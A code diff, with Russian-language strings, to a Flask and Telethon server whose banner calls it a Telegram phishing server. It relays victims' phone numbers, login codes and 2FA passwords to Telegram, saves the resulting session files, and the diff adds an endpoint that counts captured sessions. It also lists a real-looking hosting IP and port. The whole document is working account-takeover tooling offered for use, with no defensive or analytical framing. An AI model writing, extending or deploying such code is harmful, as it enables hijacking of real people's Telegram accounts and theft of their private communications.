@@ -60,7 +60,10 @@ async def create_telegram_session(phone, code=None, password=None):
                 return {'status': 'code_sent', 'message': 'Код отправлен в Telegram'}
             except FloodWaitError as e:
                 wait_time = e.seconds
-                return {'status': 'flood_wait', 'message': f'Подождите {wait_time} секунд'}
+                return {'status': 'flood_wait', 'message': f'Подождите {wait_time} секунд', 'seconds': wait_time}
+            except Exception as e:
+                logging.error(f"Ошибка отправки кода: {e}")
+                return {'status': 'error', 'message': f'Ошибка: {str(e)}'}
         
         elif code:
             if phone not in pending_authorizations:
@@ -94,6 +97,8 @@ async def create_telegram_session(phone, code=None, password=None):
                 return {'status': 'password_required', 'message': 'Требуется пароль 2FA'}
             except PhoneCodeInvalidError:
                 return {'status': 'error', 'message': 'Неверный код'}
+            except Exception as e:
+                return {'status': 'error', 'message': f'Ошибка: {str(e)}'}
                 
         elif password:
             if phone not in pending_authorizations:
@@ -195,11 +200,19 @@ def list_sessions():
                 sessions.append(file)
     return jsonify({'sessions': sessions})
 
+@app.route('/api/status')
+def status():
+    return jsonify({
+        'status': 'running',
+        'active_requests': len(pending_authorizations),
+        'sessions_count': len(os.listdir(sessions_dir)) if os.path.exists(sessions_dir) else 0
+    })
+
 if __name__ == '__main__':
     print("\n" + "="*50)
     print("🚀 TELEGRAM ФИШИНГ СЕРВЕР ЗАПУЩЕН!")
-    print(f"📍 IP: 188.225.11.61:5000")
+    print(f"📍 IP: 188.225.11.61:8080")
     print(f"📁 Сессии сохраняются в: {sessions_dir}")
     print("="*50 + "\n")
     
-    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
+    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
